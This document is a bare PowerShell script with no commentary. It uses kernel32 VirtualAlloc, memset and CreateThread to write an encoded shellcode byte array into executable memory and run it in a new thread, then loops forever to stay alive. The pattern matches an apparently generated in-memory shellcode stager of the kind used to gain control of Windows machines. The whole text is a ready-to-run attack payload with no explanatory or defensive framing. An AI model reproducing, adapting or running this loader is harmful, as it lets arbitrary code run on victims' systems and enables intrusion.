$FXQT = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $FXQT -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc2,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xbf,0x04,0x07,0x79,0x19,0xb1,0x47,0x31,0x7d,0x18,0x83,0xc5,0x04,0x03,0x7d,0x10,0xe5,0x8c,0xe5,0xf0,0x6b,0x6e,0x16,0x00,0x0c,0xe6,0xf3,0x31,0x0c,0x9c,0x70,0x61,0xbc,0xd6,0xd5,0x8d,0x37,0xba,0xcd,0x06,0x35,0x13,0xe1,0xaf,0xf0,0x45,0xcc,0x30,0xa8,0xb6,0x4f,0xb2,0xb3,0xea,0xaf,0x8b,0x7b,0xff,0xae,0xcc,0x66,0xf2,0xe3,0x85,0xed,0xa1,0x13,0xa2,0xb8,0x79,0x9f,0xf8,0x2d,0xfa,0x7c,0x48,0x4f,0x2b,0xd3,0xc3,0x16,0xeb,0xd5,0x00,0x23,0xa2,0xcd,0x45,0x0e,0x7c,0x65,0xbd,0xe4,0x7f,0xaf,0x8c,0x05,0xd3,0x8e,0x21,0xf4,0x2d,0xd6,0x85,0xe7,0x5b,0x2e,0xf6,0x9a,0x5b,0xf5,0x85,0x40,0xe9,0xee,0x2d,0x02,0x49,0xcb,0xcc,0xc7,0x0c,0x98,0xc2,0xac,0x5b,0xc6,0xc6,0x33,0x8f,0x7c,0xf2,0xb8,0x2e,0x53,0x73,0xfa,0x14,0x77,0xd8,0x58,0x34,0x2e,0x84,0x0f,0x49,0x30,0x67,0xef,0xef,0x3a,0x85,0xe4,0x9d,0x60,0xc1,0xc9,0xaf,0x9a,0x11,0x46,0xa7,0xe9,0x23,0xc9,0x13,0x66,0x0f,0x82,0xbd,0x71,0x70,0xb9,0x7a,0xed,0x8f,0x42,0x7b,0x27,0x4b,0x16,0x2b,0x5f,0x7a,0x17,0xa0,0x9f,0x83,0xc2,0x5d,0xa5,0x13,0x7a,0xbc,0x29,0x01,0xec,0xbd,0x31,0xd0,0x5e,0x48,0xd7,0x8a,0xf0,0x1b,0x48,0x6a,0xa1,0xdb,0x38,0x02,0xab,0xd3,0x67,0x32,0xd4,0x39,0x00,0xd8,0x3b,0x94,0x78,0x74,0xa5,0xbd,0xf3,0xe5,0x2a,0x68,0x7e,0x25,0xa0,0x9f,0x7e,0xeb,0x41,0xd5,0x6c,0x9b,0xa1,0xa0,0xcf,0x0d,0xbd,0x1e,0x65,0xb1,0x2b,0xa5,0x2c,0xe6,0xc3,0xa7,0x09,0xc0,0x4b,0x57,0x7c,0x5b,0x45,0xcd,0x3f,0x33,0xaa,0x01,0xc0,0xc3,0xfc,0x4b,0xc0,0xab,0x58,0x28,0x93,0xce,0xa6,0xe5,0x87,0x43,0x33,0x06,0xfe,0x30,0x94,0x6e,0xfc,0x6f,0xd2,0x30,0xff,0x5a,0xe2,0x0d,0xd6,0xa2,0x90,0x7f,0xea;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$hbP=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($hbP.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$hbP,0,0,0);for (;;){Start-sleep 60};
